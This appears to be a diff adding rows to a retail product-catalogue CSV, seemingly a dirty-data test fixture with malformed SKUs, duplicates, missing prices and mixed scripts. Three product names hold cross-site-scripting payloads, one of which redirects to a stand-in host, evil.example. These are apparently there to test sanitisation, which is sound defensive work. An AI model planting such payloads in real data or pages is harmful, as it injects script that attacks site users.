+SW-STA-00079,Star Select Sticky Notes 100 sheets,Stationery,89,64,0,SUP04,ACTIVE,8,2025-02-23
+SW-PER-00013,Smart Buy Face Wash 100ml,Personal Care,125,104,0,SUP20,ACTIVE,12,2025-11-26
+SW-PER-00050,Everyday Toothpaste 200g,Personal Care,105,74,18,SUP10,ACTIVE,8,2024-09-16
+SW-PER-00083,Everyday Face Wash 50ml,Personal Care,174,136,5,SUP20,ACTIVE,15,2025-09-24
+SW-GRO-00117,Value Pack Basmati Rice 5kg,Grocery,1187,934,5,SUP07,ACTIVE,15,2025-11-12
+SW-ELE-00015,Smart Buy AA Batteries 4 pack,Electronics Accessories,328,244,5,SUP24,ACTIVE,8,2024-01-10
+SW-SNK-00091 ,Smart Buy Potato Chips 150g,Snacks,28,20,12,SUP23,ACTIVE,25,2025-12-02
+SW-STA-00001,Royal Harvest Ball Pen 10 pack,Stationery,64,54,18,SUP04,ACTIVE,8,2025-10-12
+SW-BEV-00027,Smart Buy Instant Coffee 50g,Beverages,412,283,18,SUP08,ACTIVE,25,2024-06-20
+SW-GRO-00179,Fresh Basket Sugar 1kg,Grocery,121,95,0,SUP24,ACTIVE,20,2025-02-19
+SW-SNK-00100,Value Pack Chocolate Bar 40g,Snacks,27,22,0,SUP08,ACTIVE,20,2024-01-06
+SW-BEV-00089,Value Pack Instant Coffee 200g,Beverages,155,125,0,SUP25,ACTIVE,25,2025-10-05
+SW-ELE-00045,Value Pack Earphones basic,Electronics Accessories,758,580,18,SUP16,ACTIVE,25,2024-02-25
+SW-GRO-00048,Green Leaf Toor Dal 1kg,Grocery,173,137,0,SUP08,ACTIVE,20,2024-07-15
+SW-STA-00061,Metro Choice Ball Pen 10 pack,Stationery,84,67,12,SUP15,ACTIVE,12,2025-01-24
+SW-BEV-00077,Fresh Basket Orange Juice 200ml,Beverages,115,90,0,SUP15,ACTIVE,20,2024-02-13
+SW-PER-00080,Fresh Basket Hand Wash 250ml,Personal Care,91,67,5,SUP06,ACTIVE,25,2024-03-25
+SW-GRO-00184,Daily Fresh Atta 5kg,Grocery,383,305,5,SUP24,ACTIVE,20,2025-08-17
+SW-PER-00041,Pure Choice Face Wash 50ml,Personal Care,74,53,0,SUP03,ACTIVE,10,2024-07-06
+SW-SNK-00070,Star Select Cream Biscuits 100g,Snacks,60,41,12,SUP11,ACTIVE,25,2025-08-28
+SW-ELE-00080,Prime Select USB Cable 2m,Electronics Accessories,160,133,12,SUP24,ACTIVE,25,2025-01-21
+SW-GRO-00077,Smart Buy Basmati Rice 1kg,Grocery,276,191,18,SUP03,ACTIVE,20,2024-02-11
+SW-BEV-00057,Value Pack Mineral Water 20L,Beverages,105,74,5,SUP10,ACTIVE,12,2024-11-03
+SW-HOM-00091,Value Pack Dishwash Liquid 250ml,Household,53,44,0,SUP08,ACTIVE,12,2024-11-21
+SW-SNK-00090,Pure Choice Cream Biscuits 100g,Snacks,51,42,12,SUP14,ACTIVE,15,2025-05-17
+SW-GRO-00176,Value Pack Poha 500g,Grocery,48,40,12,SUP11,ACTIVE,12,2025-01-03
+SW-PER-00072,Value Pack Bathing Soap 3 pack,Personal Care,141,98,5,SUP24,ACTIVE,20,2024-11-25
+SW-SNK-00089,Home Basics Cream Biscuits 100g,Snacks,56,41,18,SUP03,ACTIVE,25,2025-09-03
+SW-BEV-00017,Daily Fresh Mineral Water 20L,Beverages,124,91,12,SUP22,ARCHIVED,25,2025-10-16
+SW-BEV-00082,Kitchen Pride Cola Drink 2L,Beverages,71,56,5,SUP25,ACTIVE,8,2024-03-15
+SW-BEV-00013,Everyday Instant Coffee 200g,Beverages,107,89,18,SUP08,ACTIVE,25,2024-06-19
+SW-PER-00092,Smart Buy Shampoo 180ml,Personal Care,511,364,18,SUP06,ACTIVE,20,2025-02-05
+SW-PER-00039,Everyday Face Wash 100ml,Personal Care,101,72,5,SUP09,ACTIVE,10,2025-03-02
+SW-HOM-00097,Value Pack Garbage Bags 30 pcs,Household,218,151,0,SUP06,ACTIVE,5,2025-07-23
+SW-SNK-00068,Daily Fresh Salted Peanuts 500g,Snacks,75,60,12,SUP13,ACTIVE,10,2025-03-19
+SW-ELE-00037,Everyday AA Batteries 4 pack,Electronics Accessories,214,158,18,SUP09,ACTIVE,12,2025-10-20
+SW-GRO-00062,Pure Choice Masala Mix 200g,Grocery,90,69,18,SUP18,ACTIVE,5,2025-12-26
+SW-GRO-00114,Kitchen Pride Poha 1kg,Grocery,62,50,5,SUP01,ACTIVE,10,2025-11-26
+SW-GRO-00038,Pure Choice Sugar 5kg,Grocery,162,132,12,SUP18,ACTIVE,10,2024-04-20
+SW-GRO-00173,Value Pack Poha 1kg,Grocery,67,49,12,SUP18,ACTIVE,12,2024-03-01
+SW-SNK-00079,Everyday Chocolate Bar 40g,Snacks,28,22,18,SUP22,ACTIVE,12,2025-01-12
+SW-SNK-00074,Fresh Basket Salted Peanuts 200g,Snacks,57,40,18,SUP07,ACTIVE,10,2025-05-26
+SW-GRO-00192,Fresh Basket Besan 1kg,Grocery,136,92,0,SUP22,ACTIVE,12,2025-03-23
+SW-GRO-00022,Green Leaf Besan 1kg,Grocery,151,124,0,SUP17,ACTIVE,20,2024-01-08
+SW-GRO-00125,Green Leaf Poha 1kg,Grocery,124,104,12,SUP01,ACTIVE,15,2024-02-02
+SW-GRO-00135,Pure Choice Poha 500g,Grocery,51,42,12,SUP20,ACTIVE,15,2025-05-07
+SW-BEV-00052,Metro Choice Orange Juice 1L,Beverages,57,42,18,SUP20,ACTIVE,10,2024-06-27
+SW-ELE-00042,Star Select AA Batteries 10 pack,Electronics Accessories,102,71,18,SUP05,ACTIVE,5,2024-12-24
+SW-BEV-00075,Kitchen Pride Orange Juice 1L,Beverages,134,92,0,SUP11,ACTIVE,15,2024-06-17
+SW-GRO-00172,Kitchen Pride Basmati Rice 1kg,Grocery,,383,5,SUP23,ACTIVE,25,2025-10-08
+SW-SNK-00048,Daily Fresh Chocolate Bar 40g,Snacks,81,65,0,SUP04,ACTIVE,15,2024-05-28
+SW-GRO-00071,Green Leaf Basmati Rice 5kg,Grocery,1259,952,12,SUP03,ACTIVE,12,2024-04-07
+SW-PER-00087,Daily Fresh Toothpaste 200g,Personal Care,111,91,5,SUP23,ACTIVE,15,2025-07-18
+SW-SNK-00020,Value Pack Potato Chips 150g,Snacks,58,40,0,SUP15,ACTIVE,10,2025-03-14
+SW-HOM-00037,Daily Fresh Phenyl 1L,Household,154,110,18,SUP12,ACTIVE,12,2024-08-24
+SW-HOM-00077,Value Pack Floor Cleaner 2L,Household,125,105,18,SUP07,ACTIVE,15,2025-09-05
+SW-GRO-00201,Kitchen Pride Sugar 1kg,Grocery,224,160,0,SUP07,ARCHIVED,5,2024-11-28
+SW-BEV-00036,Value Pack Energy Drink 250ml,Beverages,89,61,5,SUP16,ACTIVE,5,2024-10-08
+SW-HOM-00087,Pure Choice Dishwash Liquid 250ml,Household,60,45,0,SUP24,ACTIVE,25,2024-10-14
+SW-BEV-00004,Pure Choice Cola Drink 600ml,Beverages,67,53,18,SUP04,ACTIVE,8,2024-01-10
+SW-SNK-00052,Value Pack Namkeen Mix 200g,Snacks,42,33,18,SUP15,ACTIVE,12,2024-09-09
+SW-HOM-00063,Green Leaf Garbage Bags 30 pcs,Household,216,174,5,SUP24,ACTIVE,20,2025-04-17
+sw-per-00101,Everyday Hand Wash 250ml,Personal Care,162,134,12,SUP06,ACTIVE,25,2025-04-16
+SW-SNK-00017,Royal Harvest Cream Biscuits 300g,Snacks,53,42,12,SUP13,ACTIVE,8,2025-09-18
+SW-GRO-00017,Green Leaf Basmati Rice 10kg,Grocery,305,239,0,SUP09,ACTIVE,12,2025-08-20
+SW-GRO-00006,Smart Buy Masala Mix 100g,Grocery,122,102,12,SUP24,ACTIVE,25,2025-02-15
+SW-STA-00009,Home Basics A4 Paper 100 sheets,Stationery,172,130,0,SUP12,ACTIVE,25,2025-02-21
+SW-STA-00045,Everyday Notebook 300 pages,Stationery,104,73,5,SUP17,ACTIVE,15,2025-12-04
+SW-PER-00058,Pure Choice Face Wash 100ml,Personal Care,117,97,0,SUP24,ACTIVE,5,2024-09-21
+SW-GRO-00177,Daily Fresh Toor Dal 500g,Grocery,85,59,0,SUP11,ACTIVE,15,2024-05-18
+SW-GRO-00088 ,Star Select Poha 500g,Grocery,57,37,5,SUP21,ACTIVE,25,2024-11-26
+SW-GRO-00095,Home Basics Toor Dal 1kg,Grocery,218,166,5,SUP04,ACTIVE,25,2025-03-06
+SW-SNK-00059,Metro Choice Namkeen Mix 200g,Snacks,74,61,18,SUP13,ACTIVE,25,2024-08-06
+SW-ELE-00033,Prime Select AA Batteries 4 pack,Electronics Accessories,253,211,12,SUP08,ACTIVE,20,2024-07-10
+SW-PER-00054,Star Select Shampoo 180ml,Personal Care,117,98,0,SUP10,ACTIVE,25,2025-10-03
+SW-HOM-00086,Home Basics Detergent Powder 4kg,Household,350,246,0,SUP22,ACTIVE,15,2025-06-03
+SW-GRO-00196,Kitchen Pride Sunflower Oil 1L,Grocery,1114,911,0,SUP02,ACTIVE,10,2024-06-26
+SW-BEV-00098,Royal Harvest Orange Juice 1L,Beverages,133,108,12,SUP14,ACTIVE,5,2024-04-04
+SW-GRO-00170,Everyday Iodised Salt 1kg,Grocery,42,30,0,SUP15,ACTIVE,12,2024-01-10
+SW-HOM-00064,Kitchen Pride Floor Cleaner 500ml,Household,128,90,0,SUP13,ACTIVE,5,2025-05-18
+SW-GRO-00165,Value Pack Masala Mix 100g,Grocery,52,40,5,SUP15,ACTIVE,5,2025-06-23
+SW-SNK-00066,Star Select Salted Peanuts 500g,Snacks,52,43,18,SUP11,ACTIVE,20,2024-01-22
+SW-HOM-00009,Pure Choice Detergent Powder 4kg,Household,389,322,18,SUP24,ACTIVE,5,2025-10-10
+SW-BEV-00064,Value Pack Orange Juice 200ml,Beverages,37,30,18,SUP03,ACTIVE,5,2025-04-12
+SW-GRO-00010,Metro Choice Besan 500g,Grocery,69,54,0,SUP02,ACTIVE,25,2025-04-05
+SW-HOM-00042,Kitchen Pride Garbage Bags 30 pcs,Household,134,103,12,SUP23,ACTIVE,15,2024-08-15
+SW-PER-00048,Daily Fresh Hand Wash 250ml,Personal Care,138,103,18,SUP16,ACTIVE,12,2024-01-18
+SW-GRO-00207,Home Basics Basmati Rice 10kg,Grocery,1153,897,5,SUP03,ARCHIVED,12,2025-04-19
+SW-GRO-00108,Metro Choice Toor Dal 500g,Grocery,95,77,5,SUP16,ACTIVE,25,2024-03-20
+SW-PER-00081,Pure Choice Bathing Soap 3 pack,Personal Care,31,23,5,SUP06,ACTIVE,20,2025-10-22
+SW-ELE-00017,Home Basics AA Batteries 4 pack,Electronics Accessories,235,169,12,SUP09,ACTIVE,25,2025-02-12
+SW-BEV-00061,Smart Buy Cola Drink 2L,Beverages,89,72,12,SUP16,ACTIVE,25,2025-10-01
+SW-HOM-00074,Fresh Basket Floor Cleaner 500ml,Household,298,207,5,SUP16,ACTIVE,12,2025-06-06
+SW-GRO-00175,Star Select Masala Mix 200g,Grocery,102,77,5,SUP08,ACTIVE,8,2025-06-13
+SW-PER-00089,Prime Select Toothpaste 100g,Personal Care,81,62,0,SUP04,ACTIVE,15,2025-07-20
+SW-STA-00071,Metro Choice A4 Paper 500 sheets,Stationery,112,93,18,SUP05,ACTIVE,5,2024-11-26
+SW-GRO-00046,Kitchen Pride Masala Mix 200g,Grocery,87,66,5,SUP25,ACTIVE,8,2024-09-15
+SW-ELE-00058,Kitchen Pride LED Bulb 9W,Electronics Accessories,129,96,5,SUP24,ACTIVE,8,2025-01-06
+SW-BEV-00034,Royal Harvest Orange Juice 200ml,Beverages,89,64,18,SUP13,ACTIVE,12,2024-11-26
+SW-GRO-00023,Green Leaf Sugar 1kg <script>document.location='//evil.example'</script>,Grocery,244,205,0,SUP21,ACTIVE,20,2025-09-12
+SW-PER-00101,Everyday Hand Wash 250ml,Personal Care,162,134,12,SUP06,ACTIVE,25,2025-04-16
+SW-STA-00017,Pure Choice A4 Paper 100 sheets,Stationery,241,200,12,SUP23,ACTIVE,5,2025-06-20
+SW-BEV-00045,Green Leaf Orange Juice 1L,Beverages,151,113,18,SUP21,ACTIVE,10,2024-12-18
+SW-BEV-00007,Home Basics Mineral Water 20L,Beverages,95,66,0,SUP05,ACTIVE,10,2024-03-20
+SW-HOM-00072,Smart Buy Dishwash Liquid 750ml,Household,134,106,0,SUP06,ACTIVE,12,2024-02-27
+SW-GRO-00145,Green Leaf Sugar 5kg,Grocery,111,86,5,SUP25,ACTIVE,10,2025-06-22
+SW-GRO-00140,Everyday Basmati Rice 10kg,Grocery,352,283,12,SUP07,ACTIVE,8,2024-04-27
+SW-HOM-00045,Metro Choice Garbage Bags 30 pcs,Household,112,80,5,SUP14,ACTIVE,12,2024-03-23
+SW-STA-00033,Green Leaf A4 Paper 100 sheets,Stationery,372,282,5,SUP16,ACTIVE,10,2024-07-28
+SW-BEV-00029,Daily Fresh Energy Drink 250ml,Beverages,98,68,0,SUP10,ACTIVE,12,2025-05-04
+SW-STA-00055,Value Pack Marker Set 4 pack,Stationery,87,59,5,SUP22,ACTIVE,10,2024-04-06
+SW-GRO-00087,Value Pack Atta 1kg,Grocery,665,545,12,SUP04,ACTIVE,5,2025-01-06
+SW-HOM-00084,Home Basics Phenyl 500ml,Household,109,91,12,SUP05,ACTIVE,25,2024-02-05
+SW-GRO-00074,Prime Select Poha 500g,Grocery,68,48,18,SUP07,ACTIVE,12,2025-06-27
+SW-GRO-00036,Green Leaf Sunflower Oil 1L,Grocery,641,523,18,SUP10,ACTIVE,12,2024-12-02
+SW-PER-00082,Metro Choice Face Wash 50ml,Personal Care,194,151,5,SUP15,ACTIVE,20,2025-01-03
+SW-HOM-00018,Green Leaf Dishwash Liquid 250ml,Household,47,38,12,SUP20,ACTIVE,12,2025-11-26
+SW-SNK-00063,Green Leaf Salted Peanuts 500g,Snacks,99,74,5,SUP17,ACTIVE,5,2024-02-18
+SW-SNK-00086,Pure Choice Salted Peanuts 200g,Snacks,48,34,0,SUP14,ACTIVE,25,2024-05-14
+SW-STA-00080,Star Select Notebook 180 pages,Stationery,108,83,0,SUP01,ACTIVE,12,2025-03-15
+SW-HOM-00034,Everyday Phenyl 500ml 🥭 Special,Household,92,73,18,SUP22,ACTIVE,12,2024-11-10
+SW-PER-00100,Home Basics Toothpaste 100g <svg onload=alert(1)>,Personal Care,84,65,12,SUP16,ACTIVE,15,2025-08-10
+SW-STA-00048,Fresh Basket Notebook 180 pages,Stationery,40,31,0,SUP10,ACTIVE,15,2024-04-11
+SW-STA-00051,Pure Choice Ball Pen 10 pack,Stationery,106,88,18,SUP17,ACTIVE,12,2025-01-23
+SW-BEV-00100,Value Pack Cola Drink 2L,Beverages,86,65,5,SUP21,ACTIVE,10,2025-04-11
+SW-PER-00011,Pure Choice Shampoo 180ml,Personal Care,154,115,18,SUP07,ACTIVE,10,2024-06-28
+SW-PER-00030,Value Pack Hand Wash 250ml,Personal Care,60,50,5,SUP23,ACTIVE,8,2025-03-28
+SW-SNK-00049,Green Leaf Chocolate Bar 100g,Snacks,110,80,5,SUP02,ACTIVE,20,2025-05-12
+SW-SNK-00039,Everyday Cream Biscuits 300g,Snacks,66,47,12,SUP09,ACTIVE,5,2025-11-21
+SW-BEV-00028,Royal Harvest Instant Coffee 50g,Beverages,314,248,0,SUP25,ACTIVE,15,2025-04-23
+SW-SNK-00008,Everyday Cream Biscuits 100g,Snacks,47,39,18,SUP02,ACTIVE,12,2025-11-24
+SW-PER-00045,Metro Choice Shampoo 180ml,Personal Care,402,314,0,SUP07,ACTIVE,12,2024-07-24
+SW-GRO-00040,Pure Choice Tea Leaves 250g,Grocery,224,173,18,SUP17,ACTIVE,12,2025-03-15
+SW-HOM-00020,Kitchen Pride Dishwash Liquid 750ml,Household,193,145,0,SUP22,ACTIVE,25,2025-11-12
+SW-GRO-00033,Fresh Basket Sugar 5kg,Grocery,318,223,0,SUP03,ACTIVE,10,2025-12-24
+SW-HOM-00032,Everyday Garbage Bags 90 pcs,Household,183,142,12,SUP02,ACTIVE,5,2025-09-19
+SW-STA-00028,Home Basics Marker Set 4 pack شامبو للشعر,Stationery,139,118,5,SUP04,ACTIVE,8,2024-05-18
+SW-SNK-00080,Pure Choice Potato Chips 150g,Snacks,29,23,0,SUP07,ACTIVE,20,2025-02-15
+SW-GRO-00197,Everyday Toor Dal 1kg,Grocery,219,164,5,SUP21,ACTIVE,20,2025-11-28
+SW-SNK-00084,Prime Select Potato Chips 150g,Snacks,36,25,12,SUP22,ACTIVE,10,2025-11-10
+SW-SNK-00088,Home Basics Potato Chips 50g,Snacks,31,24,5,SUP02,ACTIVE,8,2024-01-21
+SW-GRO-00015,Star Select Atta 5kg,Grocery,135,111,12,SUP04,ACTIVE,25,2025-10-08
+SW-SNK-00040,Kitchen Pride Cream Biscuits 100g,Snacks,48,38,0,SUP11,ACTIVE,5,2025-12-24
+SW-HOM-00079,Metro Choice Phenyl 1L,Household,238,183,5,SUP03,ACTIVE,10,2025-06-22
+SW-PER-00077,Fresh Basket Hand Wash 750ml,Personal Care,218,180,5,SUP17,ACTIVE,15,2025-12-02
+SW-STA-00014,Smart Buy Notebook 300 pages,Stationery,40,28,18,SUP03,ACTIVE,5,2025-10-18
+SW-BEV-00048,Kitchen Pride Orange Juice 200ml,Beverages,60,50,12,SUP21,ACTIVE,5,2024-08-09
+SW-SNK-00051,Value Pack Cream Biscuits 300g,Snacks,68,55,12,SUP10,ACTIVE,20,2024-08-03
+SW-STA-00011,Prime Select Ball Pen 10 pack,Stationery,59,49,18,SUP07,ACTIVE,10,2025-08-25
+SW-SNK-00096,Value Pack Salted Peanuts 200g,Snacks,35,27,12,SUP04,ACTIVE,25,2025-01-08
+SW-SNK-00043,Kitchen Pride Namkeen Mix 400g,Snacks,138,115,0,SUP25,ACTIVE,8,2025-06-27
+SW-BEV-00060,Kitchen Pride Energy Drink 250ml,Beverages,123,99,5,SUP01,ACTIVE,12,2025-01-03
+SW-BEV-00076,Home Basics Mineral Water 1L,Beverages,104,72,0,SUP08,ACTIVE,15,2024-05-01
+SW-BEV-00026,Daily Fresh Cola Drink 600ml,Beverages,63,43,5,SUP19,ACTIVE,8,2025-11-18
+SW-BEV-00030,Metro Choice Orange Juice 200ml,Beverages,,25,18,SUP18,ACTIVE,15,2025-02-01
+SW-GRO-00045,Fresh Basket Basmati Rice 5kg,Grocery,393,317,12,SUP10,ACTIVE,15,2024-05-21
+SW-HOM-00050,Royal Harvest Dishwash Liquid 250ml <script>alert('xss')</script>,Household,164,126,0,SUP11,ACTIVE,15,2025-12-01
+SW-BEV-00073,Smart Buy Cola Drink 600ml,Beverages,45,33,5,SUP08,ACTIVE,10,2025-02-19
+SW-ELE-00003,Green Leaf LED Bulb 9W,Electronics Accessories,74,55,12,SUP18,ACTIVE,5,2025-06-22
+SW-BEV-00043,Fresh Basket Mineral Water 1L,Beverages,109,78,5,SUP13,ACTIVE,10,2024-10-19
+SW-PER-00028,Green Leaf Shampoo 650ml,Personal Care,345,244,12,SUP10,ACTIVE,15,2025-09-22
+SW-GRO-00146,Prime Select Atta 5kg,Grocery,402,326,18,SUP03,ACTIVE,12,2025-08-21
+SW-SNK-00103,Daily Fresh Namkeen Mix 400g,Snacks,85,61,0,SUP05,ACTIVE,10,2025-08-06
+SW-BEV-00010,Everyday Orange Juice 1L,Beverages,181,126,12,SUP23,ACTIVE,12,2024-10-10
+SW-BEV-00078,Everyday Cola Drink 600ml,Beverages,,64,12,SUP04,ACTIVE,5,2025-11-13
+SW-GRO-00149,Smart Buy Sugar 5kg,Grocery,130,102,5,SUP11,ACTIVE,5,2024-01-18
+SW-BEV-00018,Home Basics Energy Drink 250ml,Beverages,106,78,0,SUP02,ACTIVE,25,2024-10-18
+SW-GRO-00098,Metro Choice Atta 5kg,Grocery,128,105,5,SUP10,ACTIVE,20,2025-06-09
+SW-ELE-00043,Royal Harvest Earphones wired,Electronics Accessories,252,207,0,SUP01,ACTIVE,25,2024-11-21
+SW-GRO-00185,Pure Choice Toor Dal 1kg,Grocery,261,203,5,SUP16,ARCHIVED,25,2025-07-08
+SW-GRO-00189,Star Select Sugar 5kg,Grocery,167,128,18,SUP12,ACTIVE,8,2025-05-07
+SW-ELE-00086,Metro Choice LED Bulb 12W,Electronics Accessories,153,129,18,SUP25,ACTIVE,8,2025-03-26
+SW-PER-00003,Metro Choice Hand Wash 750ml,Personal Care,76,62,5,SUP14,ACTIVE,15,2025-09-03
+SW-GRO-00099,Everyday Sunflower Oil 1L,Grocery,863,646,0,SUP06,ACTIVE,8,2024-01-08
+SW-BEV-00094,Kitchen Pride Cola Drink 600ml,Beverages,61,43,5,SUP16,ACTIVE,8,2024-06-03
+SW-PER-00035,Kitchen Pride Hand Wash 750ml,Personal Care,205,173,18,SUP03,ACTIVE,12,2025-05-11
+SW-BEV-00063,Kitchen Pride Mineral Water 20L,Beverages,27,20,18,SUP05,ACTIVE,15,2024-03-16
+SW-HOM-00062,Star Select Floor Cleaner 500ml,Household,198,153,0,SUP03,ACTIVE,25,2025-09-18
+SW-STA-00024,Pure Choice Marker Set 4 pack,Stationery,115,90,18,SUP04,ACTIVE,8,2025-01-13
+SW-SNK-00064,Fresh Basket Chocolate Bar 100g,Snacks,52,42,12,SUP12,ARCHIVED,25,2025-04-20
+SW-GRO-00130,Smart Buy Poha 500g,Grocery,44,34,18,SUP07,ACTIVE,15,2024-11-27
+SW-HOM-00039,Everyday Phenyl 1L,Household,210,147,18,SUP02,ACTIVE,10,2024-12-28
+SW-GRO-00039,Value Pack Toor Dal 1kg,Grocery,264,212,12,SUP19,ACTIVE,10,2025-12-19
+SW-PER-00049,Star Select Hand Wash 750ml,Personal Care,61,49,5,SUP23,ACTIVE,10,2025-03-04
+SW-GRO-00127,Prime Select Sugar 1kg,Grocery,297,244,5,SUP06,ACTIVE,8,2024-10-27
+SW-GRO-00054,Everyday Basmati Rice 5kg,Grocery,1214,920,5,SUP23,ACTIVE,8,2025-11-27
+SW-SNK-00085,Royal Harvest Salted Peanuts 200g,Snacks,100,71,5,SUP10,ACTIVE,20,2024-07-25
+SW-PER-00026,Star Select Face Wash 50ml,Personal Care,120,97,12,SUP04,ACTIVE,15,2024-10-18
+SW-SNK-00022,Value Pack Potato Chips 50g,Snacks,43,33,18,SUP12,ARCHIVED,25,2024-05-02
+SW-HOM-00052,Daily Fresh Phenyl 500ml,Household,67,49,18,SUP18,ACTIVE,10,2025-09-15
+SW-HOM-00019,Everyday Detergent Powder 1kg,Household,662,526,18,SUP02,ACTIVE,8,2024-04-25
+SW-PER-00090,Everyday Shampoo 180ml,Personal Care,380,322,12,SUP18,ACTIVE,5,2024-02-01
+SW-PER-00055,Royal Harvest Hand Wash 250ml,Personal Care,105,73,0,SUP25,ACTIVE,15,2025-11-18
+SW-ELE-00067,Daily Fresh Earphones wired,Electronics Accessories,323,221,0,SUP23,ACTIVE,25,2025-03-17
+SW-BEV-00090,Daily Fresh Orange Juice 200ml,Beverages,92,67,0,SUP15,ACTIVE,8,2025-07-03
+SW-SNK-00010,Daily Fresh Cream Biscuits 100g,Snacks,25,20,18,SUP04,ACTIVE,25,2025-04-10
+SW-GRO-00066,Daily Fresh Masala Mix 100g,Grocery,101,74,12,SUP02,ACTIVE,25,2024-01-28
+SW-STA-00073,Kitchen Pride Notebook 180 pages,Stationery,37,28,12,SUP09,ACTIVE,8,2025-05-28
+SW-GRO-00034,Pure Choice Basmati Rice 5kg,Grocery,669,501,18,SUP19,ARCHIVED,5,2024-06-21
+SW-ELE-00070,Pure Choice AA Batteries 10 pack,Electronics Accessories,258,193,12,SUP24,ACTIVE,25,2025-05-21
+SW-ELE-00068,Metro Choice Power Bank 10000mAh,Electronics Accessories,1123,862,0,SUP07,ACTIVE,10,2025-07-10
+SW-SNK-00093,Everyday Namkeen Mix 400g,Snacks,97,71,18,SUP06,ACTIVE,10,2025-10-19
+SW-GRO-00091,Smart Buy Sunflower Oil 5L,Grocery,636,468,5,SUP05,ACTIVE,10,2024-06-02
+SW-SNK-00060,Daily Fresh Cream Biscuits 300g,Snacks,23,18,18,SUP09,ACTIVE,25,2025-03-22
+SW-HOM-00059,Fresh Basket Garbage Bags 90 pcs,Household,143,107,5,SUP04,ACTIVE,8,2024-03-04
+SW-ELE-00085,Home Basics Earphones wired,Electronics Accessories,449,322,5,SUP19,ACTIVE,5,2025-01-02
+SW-GRO-00200,Fresh Basket Masala Mix 100g,Grocery,112,90,5,SUP07,ACTIVE,8,2025-09-15
+SW-HOM-00003,Prime Select Phenyl 1L,Household,199,144,18,SUP21,ACTIVE,10,2024-11-08
+SW-STA-00037,Kitchen Pride Notebook 300 pages,Stationery,59,42,18,SUP01,ACTIVE,8,2024-12-05
+sw-per-00099,Home Basics Shampoo 180ml,Personal Care,149,105,5,SUP17,ACTIVE,20,2024-05-14
+SW-ELE-00012,Royal Harvest AA Batteries 4 pack 🇮🇳,Electronics Accessories,159,116,18,SUP18,ACTIVE,12,2025-01-25
+SW-STA-00027,Smart Buy Notebook 180 pages,Stationery,95,80,18,SUP14,ARCHIVED,20,2025-07-23
+SW-GRO-00085,Metro Choice Masala Mix 100g,Grocery,89,67,5,SUP08,ACTIVE,10,2025-06-26
+SW-SNK-00042,Prime Select Potato Chips 50g,Snacks,54,38,5,SUP12,ACTIVE,12,2024-11-10
+SW-ELE-00062,Smart Buy Earphones basic,Electronics Accessories,,463,18,SUP08,ACTIVE,20,2024-04-15
+SW-GRO-00042,Prime Select Sunflower Oil 5L,Grocery,872,595,12,SUP10,ACTIVE,15,2024-03-20
+SW-GRO-00109,Prime Select Basmati Rice 10kg,Grocery,664,468,0,SUP10,ACTIVE,12,2024-11-17
+SW-ELE-00081,Prime Select Power Bank 10000mAh,Electronics Accessories,753,634,0,SUP20,ACTIVE,8,2025-11-25
+SW-SNK-00021,Smart Buy Namkeen Mix 400g,Snacks,63,45,12,SUP08,ACTIVE,10,2025-12-07
+SW-ELE-00083,Pure Choice Power Bank 10000mAh 🧴✨,Electronics Accessories,1496,1077,18,SUP03,ACTIVE,25,2025-08-18
+SW-GRO-00158,Value Pack Sugar 5kg,Grocery,68,49,0,SUP17,ACTIVE,8,2025-01-10
+SW-ELE-00048,Home Basics AA Batteries 10 pack,Electronics Accessories,88,68,18,SUP25,ACTIVE,15,2024-01-18
+sw-gro-00055,Home Basics Iodised Salt 1kg,Grocery,34,25,5,SUP23,ACTIVE,20,2024-09-24
+SW-GRO-00076,Value Pack Sugar 1kg,Grocery,196,148,0,SUP23,ACTIVE,10,2024-07-23
+SW-HOM-00061,Star Select Dishwash Liquid 250ml,Household,48,34,12,SUP01,ACTIVE,20,2024-11-28
+SW-PER-00017,Royal Harvest Shampoo 180ml,Personal Care,304,220,0,SUP11,ACTIVE,8,2025-11-09
+SW-PER-00084,Metro Choice Toothpaste 100g,Personal Care,74,51,12,SUP17,ACTIVE,15,2025-01-04
+SW-GRO-00070,Everyday Basmati Rice 1kg,Grocery,438,337,5,SUP25,ACTIVE,12,2025-09-17
+SW-ELE-00054,Prime Select LED Bulb 9W,Electronics Accessories,69,55,5,SUP21,ACTIVE,12,2025-01-07
+sw-hom-00080,Fresh Basket Floor Cleaner 2L,Household,248,196,12,SUP06,ACTIVE,10,2025-10-05
+SW-HOM-00040,Metro Choice Floor Cleaner 2L,Household,521,368,12,SUP13,ACTIVE,15,2024-05-23
+SW-GRO-00166,Daily Fresh Basmati Rice 5kg,Grocery,1232,965,5,SUP13,ACTIVE,15,2025-01-25
+SW-ELE-00011,Metro Choice USB Cable 2m,Electronics Accessories,420,296,12,SUP04,ACTIVE,15,2024-11-11
+SW-PER-00001,Royal Harvest Face Wash 50ml,Personal Care,199,161,0,SUP20,ACTIVE,5,2024-11-22
+SW-BEV-00050,Home Basics Instant Coffee 200g,Beverages,217,169,5,SUP03,ACTIVE,25,2024-05-10
+SW-PER-00024,Everyday Hand Wash 750ml,Personal Care,151,112,18,SUP22,ACTIVE,12,2024-01-18
+SW-ELE-00002,Pure Choice LED Bulb 12W,Electronics Accessories,73,60,5,SUP16,ACTIVE,15,2024-04-15
+SW-GRO-00113,Smart Buy Tea Leaves 500g,Grocery,220,161,18,SUP24,ACTIVE,20,2024-02-13
+SW-HOM-00036,Everyday Floor Cleaner 2L,Household,268,217,5,SUP12,ACTIVE,5,2025-02-10
+SW-STA-00078,Daily Fresh Notebook 300 pages,Stationery,66,50,0,SUP16,ACTIVE,20,2025-08-20
+SW-SNK-00031,Smart Buy Salted Peanuts 200g,Snacks,98,69,12,SUP01,ACTIVE,8,2024-12-27
+SW-GRO-00027,Pure Choice Sunflower Oil 1L,Grocery,965,684,18,SUP23,ACTIVE,12,2024-03-03
+SW-BEV-00099,Home Basics Orange Juice 1L,Beverages,194,164,12,SUP25,ACTIVE,15,2024-08-25
+SW-PER-00005,Kitchen Pride Toothpaste 200g,Personal Care,110,85,12,SUP21,ACTIVE,10,2024-08-03
+SW-GRO-00122,Pure Choice Toor Dal 500g,Grocery,144,113,0,SUP22,ACTIVE,10,2025-02-13
+SW-HOM-00076,Metro Choice Garbage Bags 90 pcs,Household,207,159,18,SUP01,ACTIVE,25,2025-12-06
+SW-STA-00059,Green Leaf Ball Pen 10 pack,Stationery,116,89,18,SUP24,ARCHIVED,5,2025-11-15
+SW-GRO-00159,Star Select Masala Mix 100g,Grocery,129,92,12,SUP01,ACTIVE,25,2025-09-17
+SW-PER-00023,Fresh Basket Face Wash 50ml,Personal Care,208,156,5,SUP03,ACTIVE,20,2024-01-07
+SW-GRO-00089,Home Basics Besan 500g,Grocery,90,61,18,SUP23,ACTIVE,10,2025-09-26
